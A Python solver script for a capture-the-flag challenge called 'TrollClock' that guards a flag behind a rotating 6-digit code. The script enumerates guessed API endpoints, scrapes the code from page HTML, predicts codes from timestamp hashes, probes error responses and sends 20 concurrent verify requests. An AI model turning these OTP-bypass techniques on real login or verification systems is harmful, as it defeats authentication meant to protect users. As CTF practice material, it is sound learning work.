#!/usr/bin/env python3
"""
TrollClock CTF Challenge Solver
KPMG KICyber CTF 2025

The challenge presents a 6-digit code that refreshes every 10 seconds.
A new challenge is issued every 37 seconds.
Hint: "You start with errors and you learn to live with it"

Likely vulnerability: The OTP is either:
1. Fetched from a server-side API endpoint (most common CTF pattern)
2. Generated client-side from a predictable timestamp seed
3. Has a timing window where old/adjacent codes are still accepted

Strategy:
- Step 1: Load the page, extract session cookie
- Step 2: Find how the OTP is obtained (API endpoint or JS logic)
- Step 3: Fetch the current OTP and immediately submit it
- Step 4: If timing attack is needed, try codes from adjacent time windows
"""

import requests
import time
import re
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://kicyber-00c797b2c34e-trollclock-0-0.chals.io"

session = requests.Session()

_CODE_RE = re.compile(r'^\d{6}$')


def _sanitize(text):
    """Strip control characters from user-facing output derived from HTTP responses."""
    return text.replace('\n', ' ').replace('\r', '').replace('\x00', '')


def _validate_code(candidate):
    """Return candidate only if it is exactly 6 ASCII digits, else None."""
    if candidate and _CODE_RE.match(candidate):
        return candidate
    return None


def get_page_and_extract_code():
    """Load the main page and try to extract OTP from HTML/JS"""
    resp = session.get(BASE_URL, timeout=10)
    print(f"[*] Page status: {resp.status_code}")

    patterns = [
        r'data-code["\s]*[:=]["\s]*["\']?(\d{6})',
        r'var\s+code\s*=\s*["\'](\d{6})',
        r'"code"\s*:\s*"?(\d{6})',
        r'otp["\s]*[:=]["\s]*["\']?(\d{6})',
        r'token["\s]*[:=]["\s]*["\']?(\d{6})',
        r'>(\d{6})<',
    ]

    for p in patterns:
        m = re.search(p, resp.text, re.IGNORECASE)
        if m:
            code = _validate_code(m.group(1))
            if code:
                print(f"[+] Found code in HTML: {_sanitize(code)}")
                return code, resp.cookies

    print("[*] Code not found in HTML.")
    return None, resp.cookies


def try_api_endpoints():
    """Try common API endpoints to get the current code"""
    endpoints = [
        "/api/code",
        "/api/otp",
        "/api/token",
        "/code",
        "/otp",
        "/get_code",
        "/challenge",
        "/api/challenge",
        "/api/current_code",
    ]

    for ep in endpoints:
        try:
            r = session.get(BASE_URL + ep, timeout=5)
            if r.status_code == 200:
                print(f"[+] API endpoint found: {ep}")
                safe_preview = _sanitize(r.text[:200])
                print(f"    Response: {safe_preview}")

                m = re.search(r'\b(\d{6})\b', r.text)
                if m:
                    code = _validate_code(m.group(1))
                    if code:
                        return code, ep

                try:
                    data = r.json()
                    for key in ['code', 'otp', 'token', 'value']:
                        if key in data:
                            code = _validate_code(str(data[key]))
                            if code:
                                return code, ep
                except (ValueError, KeyError):
                    pass
        except (requests.RequestException, OSError):
            pass

    return None, None


def verify_code(code):
    """Submit the code to verify endpoint"""
    safe_code = _validate_code(code)
    if not safe_code:
        return None

    endpoints = ["/verify", "/submit", "/check", "/validate", "/api/verify"]

    for ep in endpoints:
        try:
            r = session.post(BASE_URL + ep,
                             data={"code": safe_code},
                             timeout=10,
                             allow_redirects=False)

            if r.status_code in [200, 302]:
                text = r.text.lower()
                if any(kw in text for kw in ['flag', 'kpmg_ctf', 'correct', 'success', 'congratulation']):
                    print("[!!!] FLAG FOUND via POST to endpoint!")
                    flag_match = re.search(r'KPMG_CTF\{[^}]+\}', r.text, re.IGNORECASE)
                    if flag_match:
                        return flag_match.group(0)
                    return "[flag found - check response]"

            r = session.post(BASE_URL + ep,
                             json={"code": safe_code},
                             timeout=10,
                             allow_redirects=False)

            if r.status_code in [200, 302]:
                text = r.text.lower()
                if any(kw in text for kw in ['flag', 'kpmg_ctf', 'correct', 'success']):
                    print("[!!!] FLAG FOUND via JSON POST to endpoint!")
                    flag_match = re.search(r'KPMG_CTF\{[^}]+\}', r.text, re.IGNORECASE)
                    if flag_match:
                        return flag_match.group(0)
                    return "[flag found - check response]"

        except requests.RequestException:
            pass

    return None


def predict_code_from_timestamp():
    """
    Try common timestamp-based code generation patterns.
    If the code is predictable from time, we can submit it directly.
    """
    t = int(time.time())

    candidates = [
        t % 1000000,
        (t // 10) % 1000000,
        int(hashlib.sha256(str(t // 10).encode()).hexdigest()[:6], 16) % 1000000,
        int(hashlib.sha256(str(t // 37).encode()).hexdigest()[:6], 16) % 1000000,
        (t // 37) % 1000000,
    ]

    return [f"{c:06d}" for c in candidates]


def race_condition_attack():
    """
    Race condition: send many requests concurrently to hit the code
    during the transition window between old and new codes.
    """
    print("[*] Attempting race condition attack...")

    code, _ = get_page_and_extract_code()
    if not code:
        print("[!] Could not extract code from page")
        return None

    safe_display = _sanitize(code)
    print(f"[*] Current code: {safe_display}")

    def attempt(c):
        return verify_code(c)

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(attempt, code) for _ in range(20)]
        for f in as_completed(futures):
            result = f.result()
            if result:
                return result

    return None


def timing_attack_on_error_messages():
    """
    The hint 'You start with errors and you learn to live with it'
    suggests examining error responses carefully.
    """
    print("[*] Probing error messages for hints...")

    test_cases = [
        "",
        "000000",
        "abc123",
        None,
    ]

    for tc in test_cases:
        try:
            if tc is None:
                r = session.post(BASE_URL + "/verify", data={}, timeout=5)
            else:
                r = session.post(BASE_URL + "/verify", data={"code": tc}, timeout=5)

            safe_body = _sanitize(r.text[:200])
            print(f"  Input={repr(tc)}: status={r.status_code}, body={safe_body}")

            m = re.search(r'\b(\d{6})\b', r.text)
            if m:
                code = _validate_code(m.group(1))
                if code:
                    print(f"[!!!] Potential code in error response: {_sanitize(code)}")
                    return code
        except requests.RequestException as e:
            print(f"  Error: {e}")

    return None


def main():
    print("=" * 60)
    print("TrollClock CTF Solver")
    print(f"Target: {BASE_URL}")
    print("=" * 60)

    code_from_error = timing_attack_on_error_messages()
    if code_from_error:
        result = verify_code(code_from_error)
        if result:
            print(f"\n[FLAG] {_sanitize(result)}")
            return

    print("\n[*] Checking API endpoints...")
    api_code, ep = try_api_endpoints()
    if api_code:
        print(f"[+] Got code {_sanitize(api_code)} from {ep}")
        result = verify_code(api_code)
        if result:
            print(f"\n[FLAG] {_sanitize(result)}")
            return

    print("\n[*] Extracting code from page...")
    page_code, _ = get_page_and_extract_code()
    if page_code:
        result = verify_code(page_code)
        if result:
            print(f"\n[FLAG] {_sanitize(result)}")
            return

    print("\n[*] Trying timestamp-based code prediction...")
    candidates = predict_code_from_timestamp()
    for c in candidates:
        print(f"[*] Trying predicted code: {c}")
        result = verify_code(c)
        if result:
            print(f"\n[FLAG] {_sanitize(result)}")
            return

    print("\n[*] Trying race condition attack...")
    result = race_condition_attack()
    if result:
        print(f"\n[FLAG] {_sanitize(result)}")
        return

    print("\n[!] Could not solve challenge automatically.")
    print("    The challenge instance may be offline.")
    print("    Manual analysis of the page source required.")


if __name__ == "__main__":
    main()
